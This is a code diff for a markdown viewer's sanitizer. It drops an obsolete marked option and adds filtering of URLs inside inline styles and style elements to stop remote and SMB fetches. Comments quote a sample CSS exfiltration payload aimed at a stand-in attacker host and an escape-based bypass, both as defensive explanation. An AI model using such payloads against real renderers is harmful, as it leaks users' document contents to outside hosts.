@@ -88,13 +88,17 @@ function ensureMermaid() {
   return mermaidLoadPromise;
 }
 
-// Configure marked
+// Configure marked.
+// SEC-25: `sanitize` was deprecated in marked 0.7 and REMOVED in v5; this app
+// runs marked 9, so passing it here does nothing at all. It is deleted rather
+// than left as a false reassurance - DOMPurify (SANITIZE_CONFIG below) is the
+// sole sanitization boundary in this pipeline, and setting `sanitize: true`
+// here would not add one.
 marked.setOptions({
   breaks: true,
   gfm: true,
   headerIds: true,
-  mangle: false,
-  sanitize: false
+  mangle: false
 });
 
 // ============================================
@@ -183,6 +187,87 @@ function isLocalImagePath(value) {
   return !UNC_SEPARATOR.test(src.replace(/^file:\/\/\//i, ''));
 }
 
+// SEC-21: `style` is in ADD_TAGS/ADD_ATTR and cannot simply be removed - the
+// notes feature, the theme system and upstream's own markdown all depend on
+// inline styles. That leaves CSS as a fetch surface the link policy never sees:
+//
+//   <div style="background-image:url(https://attacker.example/?doc=secret)">
+//
+// needs no click and no script. The main-window CSP does not stop it either,
+// because `img-src https:` is deliberately open so that ordinary documents can
+// show remote images. So the URLs *inside* CSS are filtered here instead.
+//
+// CSS allows `\68 ttps:` style escapes anywhere in a token, so the value is
+// decoded before it is judged; testing the raw text would be trivially bypassed.
+const CSS_ESCAPE = /\\([0-9a-fA-F]{1,6})[ \t\r\n\f]?|\\([^\r\n\f])/g;
+function decodeCssEscapes(value) {
+  return String(value == null ? '' : value).replace(CSS_ESCAPE, (m, hex, ch) => {
+    if (!hex) return ch;
+    const code = parseInt(hex, 16);
+    // 0 and lone surrogates are not representable; CSS maps them to U+FFFD.
+    if (!code || (code >= 0xd800 && code <= 0xdfff) || code > 0x10ffff) return '\uFFFD';
+    return String.fromCodePoint(code);
+  });
+}
+
+const CSS_ANY_SCHEME = /^[a-z][a-z0-9+.-]*:/i;
+// SVG is excluded on purpose: a data: SVG is a document that can carry script,
+// not just pixels.
+const CSS_INERT_DATA_IMAGE = /^data:image\/(?:png|jpe?g|gif|webp|bmp|x-icon|vnd\.microsoft\.icon);/i;
+
+function isSafeCssUrl(raw) {
+  const value = decodeCssEscapes(raw).trim();
+  if (!value) return false;
+  // //host/share, file://host/share - a silent SMB fetch on Windows, i.e. the
+  // NTLM leak guarded against for <img> above.
+  if (REMOTE_SHARE_PATH.test(value)) return false;
+  if (CSS_INERT_DATA_IMAGE.test(value)) return true;
+  if (isLocalImagePath(value)) return true;
+  // Anything else carrying a scheme is remote (http:, https:, blob:, javascript:).
+  if (CSS_ANY_SCHEME.test(value)) return false;
+  // No scheme: a relative path, resolved against the local document.
+  return true;
+}
+
+// The unquoted branch must treat a hex escape as one unit: CSS terminates
+// `\68` with an optional whitespace character, so `url(\68 ttps://evil/)` is a
+// single token containing a space. Matching `[^)\s]` greedily instead stops at
+// that space, the token never matches, and the value sails through unfiltered -
+// which is exactly what the SEC-21 escape test caught.
+const CSS_HEX_ESCAPE = String.raw`\\[0-9a-fA-F]{1,6}[ \t\r\n\f]?`;
+const CSS_URL_TOKEN = new RegExp(
+  String.raw`url\(\s*(?:"((?:[^"\\]|\\[\s\S])*)"|'((?:[^'\\]|\\[\s\S])*)'|((?:` +
+    CSS_HEX_ESCAPE +
+    String.raw`|\\[\s\S]|[^)\\\s])*))\s*\)`,
+  'gi',
+);
+// image-set() and @font-face `src:` take a bare quoted string with no url()
+// wrapper, so they are a second, independent way to name a remote resource.
+const CSS_IMAGE_SET = /(-webkit-)?image-set\(([^)]*)\)/gi;
+const CSS_BARE_STRING = /"((?:[^"\\]|\\[\s\S])*)"|'((?:[^'\\]|\\[\s\S])*)'/g;
+// @import can pull in a remote stylesheet without url(). The main-window CSP
+// (`style-src 'self' 'unsafe-inline'`) already refuses this, but the popup and
+// export surfaces do not all share that policy, so it is removed at source.
+const CSS_IMPORT_RULE = /@import\b[^;{]*(?:;|$)/gi;
+
+const CSS_BLOCKED_URL = 'about:blank';
+
+function sanitizeCssText(css) {
+  const text = String(css == null ? '' : css);
+  if (!text) return text;
+  return text
+    .replace(CSS_IMPORT_RULE, '')
+    .replace(CSS_IMAGE_SET, (match, prefix, body) =>
+      `${prefix || ''}image-set(${body.replace(CSS_BARE_STRING, (m, dq, sq) => {
+        const raw = dq !== undefined ? dq : sq;
+        return isSafeCssUrl(raw) ? m : `"${CSS_BLOCKED_URL}"`;
+      })})`)
+    .replace(CSS_URL_TOKEN, (match, dq, sq, bare) => {
+      const raw = dq !== undefined ? dq : sq !== undefined ? sq : bare;
+      return isSafeCssUrl(raw) ? match : `url("${CSS_BLOCKED_URL}")`;
+    });
+}
+
 let sanitizerHooksInstalled = false;
 function installSanitizerHooks() {
   if (sanitizerHooksInstalled) return;
@@ -206,6 +291,20 @@ function installSanitizerHooks() {
       // denies subframe navigation, which blocks the load, but the element
       // should not exist in the first place. (SEC-11)
       node.removeAttribute('src');
+    }
+    // SEC-21: filter CSS URLs on both surfaces that carry them - the `style`
+    // attribute and the text inside a `<style>` element. This runs in
+    // afterSanitizeAttributes rather than uponSanitizeAttribute so the value
+    // read here is the one DOMPurify has already accepted and normalised.
+    if (node.hasAttribute && node.hasAttribute('style')) {
+      const raw = node.getAttribute('style');
+      const safe = sanitizeCssText(raw);
+      if (safe !== raw) node.setAttribute('style', safe);
+    }
+    if (node.tagName === 'STYLE') {
+      const raw = node.textContent;
+      const safe = sanitizeCssText(raw);
+      if (safe !== raw) node.textContent = safe;
     }
   });
 
